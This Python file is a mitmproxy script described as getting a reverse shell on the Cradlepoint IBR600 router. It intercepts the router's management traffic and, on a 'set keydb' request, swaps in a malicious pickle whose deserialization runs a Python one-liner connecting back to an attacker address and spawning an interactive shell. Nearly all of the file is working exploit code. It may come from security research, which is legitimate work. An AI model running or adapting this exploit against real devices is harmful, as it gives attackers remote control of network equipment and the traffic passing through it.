"""Get a reverse shell on the Cradlepoint IBR600 router."""

import base64
import json
import logging
import pickle
import struct
import zlib

from mitmproxy import tcp
from mitmproxy.utils import strutils


_ATTACKER_IP = "192.168.0.254"
_ATTACKER_PORT = "5555"
_PAYLOAD = [
    "/bin/sh",
    "-c",
    f'/usr/bin/cppython -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({_ATTACKER_IP},{_ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
]


class Reverse:
    def __reduce__(self):
        import subprocess

        return subprocess.Popen(_PAYLOAD, 0)


class StreamTranscoderV1:
    header_sof_magic = 194
    header_struct = struct.Struct("!BII")
    header_size = header_struct.size
    encoder = json.JSONEncoder(separators=(",", ":"))
    decoder = json.JSONDecoder()
    compression_levels = [(0, 0), (100, 1), (1000, 3), (10000, 6), (100000, 9)]

    def _calc_sof(self, *numbers):
        seed = sum(numbers) & 255
        return self.header_sof_magic ^ (seed ^ 255)

    def header_encode(self, size, cmd_id):
        sof = self._calc_sof(size, cmd_id)
        return self.header_struct.pack(sof, size, cmd_id)

    def header_decode(self, data):
        (sof_claim, size, cmd_id) = self.header_struct.unpack(data)
        sof_actual = self._calc_sof(size, cmd_id)
        if sof_claim != sof_actual:
            raise ValueError("Invalid start of frame byte")
        return (size, cmd_id)

    def decode(self, data):
        compressed = data[0:1] == b"\x01"
        data = data[1:]
        if compressed:
            data = self.decompress(data)
        return self.decoder.decode(data.decode())

    def encode(self, obj):
        json_data = self.encoder.encode(obj).encode()
        size = len(json_data)
        level = max(
            (level for min_size, level in self.compression_levels if size >= min_size)
        )
        if level:
            return b"\x01" + self.compress(json_data, level)
        return b"\x00" + json_data

    def compress(self, data, level):
        return zlib.compress(data, level)

    def decompress(self, data):
        return zlib.decompress(data)


def tcp_message(flow: tcp.TCPFlow):
    message = flow.messages[-1]
    transcoder = StreamTranscoderV1()
    message_decoded, message_encoded = b"", b""
    command, file = "", ""

    try:
        msg_size, cmd_id = transcoder.header_decode(
            message.content[: transcoder.header_size]
        )
        message_decoded = transcoder.decode(message.content[transcoder.header_size :])
        logging.info(
            "tcp_message[from_client=%s, content=%s]",
            message.from_client,
            message_decoded,
        )
    except Exception as general_exception:
        logging.info(
            "tcp_message[from_client=%s, content=%s]",
            message.from_client,
            strutils.bytes_to_escaped_str(message.content),
        )

    if message_decoded and not message.from_client:
        try:
            command = message_decoded["data"]["request"]["command"]
            file = message_decoded["data"]["request"]["options"]["file"]
        except KeyError:
            pass

    if command == "set" and file == "keydb":
        try:
            payload = base64.b64encode(pickle.dumps(Reverse()))
            message_decoded["data"]["request"]["options"]["value"] = payload.decode()
            message_data = transcoder.encode(message_decoded)
            message_header = transcoder.header_encode(len(message_data), cmd_id)
            message_encoded = message_header + message_data
            message.content = message_encoded
        except Exception as general_exception:
            logging.info("Could not patch pickle payload! %s", general_exception)
